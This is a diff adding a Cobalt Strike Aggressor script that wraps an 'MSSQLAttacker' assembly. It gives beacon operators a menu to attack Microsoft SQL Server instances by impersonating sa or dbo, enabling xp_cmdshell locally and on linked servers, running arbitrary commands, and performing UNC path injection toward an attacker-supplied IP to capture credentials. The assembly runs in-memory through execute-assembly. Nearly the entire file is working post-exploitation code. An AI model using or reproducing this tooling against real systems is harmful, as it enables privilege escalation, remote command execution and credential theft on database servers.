@@ -1,0 +1,116 @@
+$assembly = script_resource("MSSQLAttacker.exe");
+
+
+popup beacon_bottom {
+	item "MSSQLAttacker" {
+		runMSSQLAttacker($1);
+	}
+}
+
+sub runMSSQLAttacker {	
+	$bid = $1;
+	
+	$dialog = dialog("MSSQL-Attacker", %(TargetInstance => "localhost", UserName => "",Password => "",Database => "master"), lambda({
+			$Attack = $3["Attacks"];
+			
+			if ($3["TargetInstance"] ne $null) {
+				$TargetInstance = $3["TargetInstance"];
+				$TargetInstance = "-t $TargetInstance";
+			} else {
+				$TargetInstance = "-t localhost";
+			}
+
+			if ($3["Database"] ne $null) {
+				$Database = $3["Database"];
+				$Database = "-d $Database";
+			} else {
+				$Database = "-d master";
+			}
+
+		
+			$command = "cli $TargetInstance $Database -a $Attack";
+
+			if ($3["UserName"] ne $null && $3["Password"] ne $null) {
+				$command = "$command $UserName $Password";
+			}
+
+			if ($3["ImpersonateSA"] eq "true") {
+				$command ="$command -impersonateSA";
+			}
+			if ($3["ImpersonateDBO"] eq "true") {
+				if ($3["dbo"] eq $null) {
+					error("Database Name (DBO)");
+					return;
+				}
+				$dbo = $3["dbo"];
+				$command = "$command -impersonateDBO -dbo $dbo";
+			}
+
+			if ($Attack eq "checklinkedserverVersion"){
+				if ($3["ls"] eq $null) {
+					error("Linked Server");
+					return;
+				}
+				$linkedServer = $3["ls"];
+				$command = "$command -ls $linkedServer";
+			}
+			if ($Attack eq "enablelinkedcmdshell"){
+				if ($3["ls"] eq $null) {
+					error("Linked Server");
+					return;
+				}
+				$linkedServer = $3["ls"];
+				$command = "$command -ls $linkedServer";
+			}
+			if ($Attack eq "execlinkedcmd"){
+				if ($3["ls"] eq $null || $3["cmd"] eq $null) {
+					error("Linked Server || CMD");
+					return;
+				}
+				$linkedServer = $3["ls"];
+				$cmd = $3["cmd"];
+				$command = "$command -ls $linkedServer -c $cmd";
+			}
+
+			if ($Attack eq "uncpathinject"){
+				if ($3["lh"] eq $null) {
+					error("LHOST (Attacker IP)");
+					return;
+				}
+				$lhost = $3["lh"];
+				$command = "$command -l $lhost";
+			}
+			if ($Attack eq "execcmd"){
+				if ($3["cmd"] eq $null) {
+					error("Command");
+					return;
+				}
+				$cmd = $3["cmd"];
+				$command = "$command -c $cmd";
+			}
+
+			binput($bid, "execute-assembly $assembly $command");
+			bexecute_assembly($bid, $assembly, $command);
+		})
+	);
+	
+	dialog_description($dialog, "MSSQL-Attacker by Rikunj Sindhwad");
+	drow_combobox($dialog, "Attacks", "Attacks:", @("getinfo","checkimpersonate","checklinkedservers","checklinkedserverVersion","uncpathinject","enablecmdshell","enablelinkedcmdshell","execlinkedcmd","execcmd"));
+	drow_text($dialog, "TargetInstance", "TargetInstance: ");
+	drow_text($dialog, "UserName", "[Optional] UserName: ");
+	drow_text($dialog, "Password", "[Optional] Password: ");
+	drow_text($dialog, "Database", "[Optional] DatabaseName: ");
+	drow_text($dialog, "dbo", "[Optional] DatabaseName (Impersonation): ");
+	drow_text($dialog, "ls", "[Optional] Linked Server: ");
+	drow_text($dialog, "lh", "[Optional] LHOST (uncpathinject): ");
+	drow_text($dialog, "cmd", "[Optional] Command: ");
+	drow_checkbox($dialog, "ImpersonateSA", "Impersonate SA Before Attack", "ImpersonateSA");
+	drow_checkbox($dialog, "ImpersonateDBO", "Impersonate DBO Before Attack", "ImpersonateDBO");
+	dbutton_action($dialog, "Run");
+	dbutton_help($dialog, "https://github.com/RikunjSindhwad/MSSQL-Attacker/blob/main/README.md");
+	dialog_show($dialog);
+}
+sub error {
+	show_message("Missing $1");
+	
+}
